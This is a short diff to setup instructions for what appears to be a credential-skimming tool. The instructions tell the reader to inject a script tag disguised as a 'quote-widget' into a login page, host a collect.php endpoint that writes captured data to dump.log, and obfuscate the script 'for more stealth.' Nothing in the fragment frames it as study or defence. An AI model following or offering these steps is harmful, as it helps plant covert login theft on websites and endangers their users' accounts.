@@ -4,7 +4,7 @@ Add this line to a login page
 
     <script src="http://127.0.0.1/quote-widget.js"></script>
     
-Host the collect.php script and give it permission to write a dump.log file.
+Host the quote-widget.js script, collect.php file, and give collect.php permission to write a dump.log file.
 
 Obfuscate the script for more stealth.
 
